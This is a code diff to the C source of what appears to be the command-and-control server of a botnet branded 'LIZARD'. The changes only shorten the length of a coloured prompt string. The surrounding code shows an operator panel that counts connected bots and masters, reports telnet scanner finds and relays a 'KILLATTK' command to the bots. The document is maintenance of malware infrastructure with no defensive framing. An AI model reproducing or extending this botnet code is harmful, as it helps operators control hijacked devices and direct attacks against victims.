@@ -126,7 +126,7 @@ void broadcast(char *msg, int us, char *sender)
                 }
                 printf("sent to fd: %d\n", i);
                 send(i, msg, strlen(msg), MSG_NOSIGNAL);
-                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[31m#LIZARD#: ", 17, MSG_NOSIGNAL);
+                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[31m#LIZARD#: ", 16, MSG_NOSIGNAL);
                 else send(i, "\n", 1, MSG_NOSIGNAL);
         }
         free(wot);
@@ -375,7 +375,7 @@ void *BotWorker(void *sock) {
 		if(send(datafd, welcome_line, 		strlen(welcome_line), 		MSG_NOSIGNAL) == -1) goto end;
 		while(1) {
 		if(send(datafd, banner_bot_count,	strlen(banner_bot_count),	MSG_NOSIGNAL) == -1) goto end;
-		if(send(datafd, "\x1b[31m#LIZARD#: ", 17, MSG_NOSIGNAL) == -1) goto end;
+		if(send(datafd, "\x1b[31m#LIZARD#: ", 16, MSG_NOSIGNAL) == -1) goto end;
 		break;
 		}
 		pthread_create(&title, NULL, &TitleWriter, sock);
@@ -388,7 +388,7 @@ void *BotWorker(void *sock) {
 				memset(botcount, 0, 2048);
 				sprintf(botcount, "[+] - Bots: [\x1b[34m %d \x1b[31m] [+] - Masters: [\x1b[34m %d \x1b[31m]\r\n", BotsConnected(), OperatorsConnected);
 				if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return;
-				if(send(datafd, "\x1b[31m#LIZARD#: ", 17, MSG_NOSIGNAL) == -1) goto end;
+				if(send(datafd, "\x1b[31m#LIZARD#: ", 16, MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
 			if(strstr(buf, "STATUS")){
@@ -396,7 +396,7 @@ void *BotWorker(void *sock) {
 				memset(statuscount, 0, 2048);
 				sprintf(statuscount, "[+] - Bots: [\x1b[34m %d \x1b[31m] [+] - Status: [\x1b[34m %d \x1b[31m]\r\n", TELFound, scannerreport);
 				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
-								if(send(datafd, "\x1b[31m#LIZARD#: ", 17, MSG_NOSIGNAL) == -1) goto end;
+								if(send(datafd, "\x1b[31m#LIZARD#: ", 16, MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
 			if(strstr(buf, "HELP")) {
@@ -439,7 +439,7 @@ void *BotWorker(void *sock) {
 				if(send(datafd, helpline13, strlen(helpline13), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, helpline14, strlen(helpline14), MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &TitleWriter, sock);
-				if(send(datafd, "\x1b[31m#LIZARD#: ", 17, MSG_NOSIGNAL) == -1) goto end;
+				if(send(datafd, "\x1b[31m#LIZARD#: ", 16, MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
 						if(strstr(buf, "ls")) {
@@ -466,7 +466,7 @@ void *BotWorker(void *sock) {
                                 if(send(datafd, ls6,  strlen(ls6),	MSG_NOSIGNAL) == -1) goto end;
 
 				pthread_create(&title, NULL, &TitleWriter, sock);
-				if(send(datafd, "\x1b[31m#LIZARD#: ", 17, MSG_NOSIGNAL) == -1) goto end;
+				if(send(datafd, "\x1b[31m#LIZARD#: ", 16, MSG_NOSIGNAL) == -1) goto end;
 				continue;
  		}
 
@@ -475,7 +475,7 @@ void *BotWorker(void *sock) {
 				memset(killattack, 0, 2048);
 				sprintf(killattack, "!* KILLATTK\r\n");
 				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
-								if(send(datafd, "\x1b[31m#LIZARD#: ", 17, MSG_NOSIGNAL) == -1) goto end;
+								if(send(datafd, "\x1b[31m#LIZARD#: ", 16, MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
 			if(strstr(buf, "CLEAR")) {
@@ -493,7 +493,7 @@ void *BotWorker(void *sock) {
 				if(send(datafd, welcome_line, 		strlen(welcome_line), 		MSG_NOSIGNAL) == -1) goto end;
 				while(1) {
 				if(send(datafd, banner_bot_count,	strlen(banner_bot_count),	MSG_NOSIGNAL) == -1) goto end;
-				if(send(datafd, "\x1b[31m#LIZARD#: ", 17, MSG_NOSIGNAL) == -1) goto end;
+				if(send(datafd, "\x1b[31m#LIZARD#: ", 16, MSG_NOSIGNAL) == -1) goto end;
 				break;
 				}
 				continue;
@@ -505,7 +505,7 @@ void *BotWorker(void *sock) {
 
 				if(send(datafd, tos1,  strlen(tos1),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &TitleWriter, sock);
-				if(send(datafd, "\x1b[31m#LIZARD#: ", 17, MSG_NOSIGNAL) == -1) goto end;
+				if(send(datafd, "\x1b[31m#LIZARD#: ", 16, MSG_NOSIGNAL) == -1) goto end;
 				continue;
 
 			}
@@ -519,7 +519,7 @@ void *BotWorker(void *sock) {
 				goto end;
 			}
                 trim(buf);
-                if(send(datafd, "\x1b[31m#LIZARD#: ", 17, MSG_NOSIGNAL) == -1) goto end;
+                if(send(datafd, "\x1b[31m#LIZARD#: ", 16, MSG_NOSIGNAL) == -1) goto end;
                 if(strlen(buf) == 0) continue;
                 printf("%s: \"%s\"\n",accounts[find_line].username, buf);
 
